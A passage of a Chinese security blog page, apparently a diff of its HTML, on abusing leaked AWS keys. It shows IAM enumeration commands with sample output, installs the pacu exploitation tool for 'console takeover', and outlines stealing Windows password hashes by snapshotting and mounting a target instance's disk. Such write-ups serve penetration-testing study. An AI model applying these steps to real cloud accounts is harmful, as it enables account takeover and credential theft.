+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;CreateDate&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2022-01-01T01:01:01Z&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;PasswordLastUsed&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2022-01-01T01:01:01Z&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>如果返回的不是 root 那么说明当前不是根用户</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span> aws iam get<span style="color:#ff79c6">-</span>user
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;User&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Path&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;/&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;UserName&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;test&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;UserId&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;ABCDEFGHIJKLMNOPQRST&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;Arn&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:iam::0123456789:user/test&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;CreateDate&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2022-01-01T01:01:01Z&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#f1fa8c">&#34;PasswordLastUsed&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2022-01-01T01:01:01Z&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>通过下面这条命令，就可以看到自己所拥有的权限了</p>
+<pre tabindex="0"><code>aws iam list-attached-user-policies --user-name test
+</code></pre><pre tabindex="0"><code>&gt; aws iam list-attached-user-policies --user-name test
+{
+    &#34;AttachedPolicies&#34;: [
+        {
+            &#34;PolicyName&#34;: &#34;IAMFullAccess&#34;,
+            &#34;PolicyArn&#34;: &#34;arn:aws:iam::aws:policy/IAMFullAccess&#34;
+        },
+        {
+            &#34;PolicyName&#34;: &#34;AmazonECS_FullAccess&#34;,
+            &#34;PolicyArn&#34;: &#34;arn:aws:iam::aws:policy/AmazonECS_FullAccess&#34;
+        }
+    ]
+}
+</code></pre><p>不过能看到自己权限的前提是需要先拥有 iam 的相关权限(IAMFullAccess)，不然就会返回 AccessDenied</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">&gt;</span> aws iam list<span style="color:#ff79c6">-</span>attached<span style="color:#ff79c6">-</span>user<span style="color:#ff79c6">-</span>policies <span style="color:#ff79c6">--</span>user<span style="color:#ff79c6">-</span>name test
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>An error occurred (AccessDenied) when calling the ListAttachedUserPolicies operation<span style="color:#ff79c6">:</span> User<span style="color:#ff79c6">:</span> arn<span style="color:#ff79c6">:</span>aws<span style="color:#ff79c6">:</span>iam<span style="color:#ff79c6">::</span><span style="color:#bd93f9">0123456789</span><span style="color:#ff79c6">:</span>user<span style="color:#ff79c6">/</span>test is not authori
+</span></span></code></pre></div><h2 id="aws-控制台接管"><strong>AWS 控制台接管</strong></h2>
+<p>有登录凭据了直接上工具了</p>
+<p>pacu 工具里包含了很多 AWS 利用模块，首先使用 set_keys 命令将刚才获取到的 key 值添加到工具里。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>https<span style="color:#ff79c6">:</span><span style="color:#6272a4">//github.com/RhinoSecurityLabs/pacu
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>https<span style="color:#ff79c6">:</span><span style="color:#6272a4">//github.com/RhinoSecurityLabs/pacu/releases
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>python3 <span style="color:#ff79c6">-</span>m pip install <span style="color:#ff79c6">-</span>U sqlalchemy_utils<span style="color:#ff79c6">==</span><span style="color:#bd93f9">0.36.8</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>python3 <span style="color:#ff79c6">-</span>m pip install <span style="color:#ff79c6">-</span>U pacu<span style="color:#ff79c6">==</span><span style="color:#bd93f9">1.1.0</span>
+</span></span></code></pre></div><h3 id="阿里云ecs-ssrf复现">阿里云ecs ssrf复现</h3>
+<p><a href="https://wiki.teamssix.com/CloudService/IAM/aliyun-console-takeover.html">https://wiki.teamssix.com/CloudService/IAM/aliyun-console-takeover.html</a></p>
+<h3 id="参考">参考</h3>
+<p><a href="https://mp.weixin.qq.com/s/80LAt32f8bo1zYa1hVk6vA">https://mp.weixin.qq.com/s/80LAt32f8bo1zYa1hVk6vA</a></p>
+<p><a href="http://47.101.189.236:7777/CloudService/">http://47.101.189.236:7777/CloudService/</a></p>
+<p><a href="https://paper.seebug.org/1681/">https://paper.seebug.org/1681/</a></p>
+<h3 id="思路">思路</h3>
+<p>通过为目标实例打快照 —&gt; 创建磁盘 —&gt; 创建实例 —&gt; 挂载磁盘 —&gt; 利用 SAM 等文件获取密码或哈希 —&gt; 使用密码或哈希远程登录获取权限</p>
+
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    
+                    <li class="next">
+                        <a href="/2017/11/03/hello-world/" data-toggle="tooltip" data-placement="top" title="Welcome to Muscial Blog">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+                
+
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+                <section>
+                    <hr>
+                    <h5>FRIENDS</h5>
+                    <ul class="list-inline">
+                        
+                        <li><a target="_blank" href="https://3cly.github.io/link/">3cly的博客</a></li>
+                        
+                    </ul>
+                </section>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:muscial@outlook.jp">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/Muscial">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Muscial Blog 2024
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
